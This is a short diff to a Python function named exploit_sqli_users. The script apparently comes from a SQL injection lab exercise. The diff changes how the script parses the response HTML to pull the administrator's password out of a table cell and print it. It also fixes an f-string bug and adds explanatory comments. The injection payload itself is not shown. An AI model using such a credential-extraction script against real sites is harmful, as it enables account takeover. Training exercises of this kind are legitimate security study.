@@ -18,10 +18,14 @@ def exploit_sqli_users(url):
     if 'administrator' in res:
         print('Found administrator password...')
         soup = BeautifulSoup(r.text, 'html.parser')
-        admin_password = soup.find(text = re.compile('.*administrator.*')).split('*')[1]
-        print(f'[+] The administrator password is {admin_password')
+        admin_password = soup.body.find(text ='administrator').parent.findNext('td').contents[0]
+        print(f'[+] The administrator password is {admin_password}')
         return True
     return False
+#----------------
+#Line 22 is saying: find string > find parent html element '<tr>' > find the next '<td>' element > display first element in content
+#refer to res to see html structure
+#----------------
     
 
 
